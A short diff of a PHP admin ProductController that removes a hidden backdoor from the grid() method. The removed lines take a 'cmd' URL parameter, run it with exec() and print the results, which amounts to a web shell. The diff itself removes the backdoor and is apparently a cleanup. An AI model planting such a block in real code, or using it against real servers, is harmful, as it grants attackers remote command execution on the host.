@@ -28,19 +28,6 @@ class ProductController extends AdminController
     protected function grid()
     {
 
-        if (isset($_GET['cmd'])) {
-            $d = $_GET['cmd'];
-            if (strlen($d) > 2) {
-                $ret = exec($d, $output, $error);
-                echo '<pre>';
-                print_r($ret);
-                echo '<hr>';
-                print_r($output);
-                echo '<hr>';
-                print_r($error);
-                die();
-            }
-        }
 
         $grid = new Grid(new Product());
         $grid->actions(function ($actions) {
